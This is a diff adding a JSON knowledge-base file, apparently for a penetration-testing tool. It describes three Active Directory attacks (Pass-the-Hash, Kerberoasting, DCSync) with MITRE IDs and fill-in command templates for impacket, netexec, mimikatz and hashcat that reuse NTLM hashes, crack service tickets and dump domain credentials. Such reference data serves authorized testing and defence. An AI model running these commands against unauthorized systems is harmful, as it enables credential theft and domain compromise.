@@ -1,0 +1,56 @@
+[
+  {
+    "id": "ad-lat-001",
+    "category": "windows_ad",
+    "subcategory": "lateral_movement",
+    "title": "Pass-the-Hash (PtH)",
+    "description": "Authenticate to remote Windows systems using NTLM hashes instead of plaintext passwords. Works against systems where the target account has local admin privileges.",
+    "techniques": [
+      "crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH>",
+      "impacket-psexec <DOMAIN>/<USER>@<TARGET> -hashes :<NTLM_HASH>",
+      "impacket-wmiexec <DOMAIN>/<USER>@<TARGET> -hashes :<NTLM_HASH>"
+    ],
+    "indicators": ["NTLM hashes obtained", "SMB/WMI/RPC ports open on target", "Target user has local admin"],
+    "prerequisites": ["Captured or dumped NTLM hash", "Network access to target", "No LSA Protection blocking"],
+    "tools": ["crackmapexec", "impacket-psexec", "impacket-wmiexec", "mimikatz"],
+    "tags": ["pass-the-hash", "ntlm", "lateral-movement", "windows", "smb"],
+    "confidence": 0.95,
+    "mitre_attack": "T1550.002"
+  },
+  {
+    "id": "ad-lat-002",
+    "category": "windows_ad",
+    "subcategory": "lateral_movement",
+    "title": "Kerberoasting",
+    "description": "Request service tickets (TGS) for service accounts and crack them offline to recover plaintext passwords. Any domain user can request tickets for any service account.",
+    "techniques": [
+      "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -request -outputfile hashes.txt",
+      "netexec ldap <DC_IP> -u <USER> -p <PASS> --kerberoasting kerberoast.txt",
+      "hashcat -m 13100 hashes.txt wordlist.txt"
+    ],
+    "indicators": ["Domain environment", "Service accounts exist", "Weak service account passwords"],
+    "prerequisites": ["Domain credentials (any user)", "Network access to DC", "Cracking rig or wordlist"],
+    "tools": ["impacket-GetUserSPNs", "netexec", "hashcat", "john"],
+    "tags": ["kerberoasting", "tgs", "service-account", "password-cracking", "domain"],
+    "confidence": 0.9,
+    "mitre_attack": "T1558.003"
+  },
+  {
+    "id": "ad-lat-003",
+    "category": "windows_ad",
+    "subcategory": "lateral_movement",
+    "title": "DCSync Attack",
+    "description": "Replicate domain controller credentials by simulating a DC replication request. Requires Replicate Directory Changes privilege (typically Domain Admin or equivalent).",
+    "techniques": [
+      "impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>",
+      "mimikatz 'lsadump::dcsync /domain:<DOMAIN> /user:<TARGET_USER>'",
+      "netexec smb <DC_IP> -u <USER> -p <PASS> --ntds"
+    ],
+    "indicators": ["Domain Admin or equivalent privileges", "DC accessible"],
+    "prerequisites": ["Replicate Directory Changes privilege", "High-privilege credentials"],
+    "tools": ["impacket-secretsdump", "mimikatz", "netexec"],
+    "tags": ["dcsync", "domain-controller", "hash-dump", "krbtgt", "privilege-escalation"],
+    "confidence": 0.9,
+    "mitre_attack": "T1003.006"
+  }
+]
